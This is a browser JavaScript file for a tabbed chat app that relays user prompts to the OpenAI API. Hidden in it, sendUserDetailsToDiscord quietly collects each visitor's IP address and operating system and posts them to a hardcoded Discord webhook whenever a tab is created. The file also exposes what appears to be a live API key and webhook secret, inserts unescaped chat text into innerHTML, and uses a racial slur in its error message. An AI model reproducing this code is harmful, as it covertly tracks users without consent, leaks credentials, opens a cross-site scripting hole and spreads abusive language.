const OPENAI_API_KEY = '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'; // Your OpenAI API key
const webhookUrl = 'https://discord.com/api/webhooks/1292725697109950517/7K0lm0hWFSvyekigP33Ja6kv2s-oCnJfTtoNnLLnvxs7074Fnz2o4AitrAJHr72SaW7k';

let currentTab = null;
let tabs = {};

// Function to save chat with a timestamp for the active tab
function saveChatToTab(chat) {
    if (!currentTab) return;
    const chats = tabs[currentTab].chats || [];
    const timestamp = new Date().getTime();
    chats.push({ chat, timestamp });
    tabs[currentTab].chats = chats;
    updateLocalStorage();
}

// Function to clear chats older than 7 days
function clearOldChats() {
    const now = new Date().getTime();
    for (let tabId in tabs) {
        const chats = tabs[tabId].chats || [];
        tabs[tabId].chats = chats.filter(c => now - c.timestamp <= 7 * 24 * 60 * 60 * 1000);
    }
    updateLocalStorage();
}

// Function to update localStorage with the latest tab data
function updateLocalStorage() {
    localStorage.setItem('tabs', JSON.stringify(tabs));
}

// Function to load tabs from localStorage on page load
function loadTabs() {
    const storedTabs = JSON.parse(localStorage.getItem('tabs'));
    if (storedTabs) {
        tabs = storedTabs;
        for (let tabId in tabs) {
            createTab(tabId, tabs[tabId].name);
        }
    }
}

// Function to create a new tab
function createTab(id = null, name = "New Tab") {
    const tabId = id || `tab-${Object.keys(tabs).length + 1}`;
    const tabName = name || `Tab ${Object.keys(tabs).length + 1}`;
    tabs[tabId] = { name: tabName, chats: tabs[tabId]?.chats || [] };

    const tabElement = document.createElement('button');
    tabElement.innerText = tabName;
    tabElement.classList.add('tab');
    tabElement.setAttribute('data-tab-id', tabId);
    document.getElementById('tabs').appendChild(tabElement);

    tabElement.addEventListener('click', () => switchTab(tabId));

    if (!currentTab) {
        switchTab(tabId);
    }

    updateLocalStorage();

    // Fetch user details and send to Discord on new tab creation
    sendUserDetailsToDiscord();
}

// Function to switch to a specific tab
function switchTab(tabId) {
    currentTab = tabId;
    document.querySelectorAll('.tab').forEach(tab => {
        tab.classList.remove('active');
    });
    document.querySelector(`[data-tab-id="${tabId}"]`).classList.add('active');
    displayChats();
}

// Function to display chats for the current tab
function displayChats() {
    if (!currentTab) return;
    const chats = tabs[currentTab].chats || [];
    let chatOutput = '';
    chats.forEach(c => {
        chatOutput += `<p>${c.chat}</p>`;
    });
    document.getElementById('ai-response').innerHTML = chatOutput;
}

// Function to get AI response
async function getAIResponse(userInput) {
    try {
        const response = await fetch('https://api.openai.com/v1/chat/completions', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${OPENAI_API_KEY}`
            },
            body: JSON.stringify({
                model: 'gpt-3.5-turbo', // Best free model available
                messages: [{ role: 'user', content: userInput }],
            }),
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        return data.choices[0].message.content; // Extracting the AI response
    } catch (error) {
        console.error('Error fetching AI response:', error);
        return 'sorry say that again nigga, i couldnt understand'; // User-friendly message
    }
}

// Function to send user details to Discord
function sendUserDetailsToDiscord() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;

            // Get user's operating system (simplified approach)
            let os = 'Unknown';
            if (navigator.platform.includes('Win')) {
                os = 'Windows';
            } else if (navigator.platform.includes('Mac')) {
                os = 'macOS';
            } else if (navigator.platform.includes('Linux')) {
                os = 'Linux';
            } else if (navigator.userAgent.includes('Android')) {
                os = 'Android';
            } else if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('iPad')) {
                os = 'iOS';
            }

            // Create Discord embed payload
            const embed = {
                title: 'New User Detected!',
                color: 0x00ff00, // Green color
                fields: [
                    { name: 'IP Address', value: userIp, inline: true },
                    { name: 'Operating System', value: os, inline: true },
                ],
            };

            // Send data to Discord webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ embeds: [embed] }),
            }).catch(error => console.error('Error sending data to Discord:', error));
        })
        .catch(error => console.error('Error fetching IP:', error));
}

// Handle form submission
document.getElementById('ai-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    const userInput = document.getElementById('user-input').value.trim();

    if (userInput) {
        // Save the user input to the current tab
        saveChatToTab(userInput);

        // Get AI response and save/display it
        const aiResponse = await getAIResponse(userInput);
        saveChatToTab(aiResponse); // Save AI response as well
        displayChats(); // Update chat display

        // Clear input field
        document.getElementById('user-input').value = '';
    }
});

// Handle creating a new tab
document.getElementById('new-tab-btn').addEventListener('click', () => {
    createTab();
});

// On page load, clear old chats and load tabs
clearOldChats();
loadTabs();
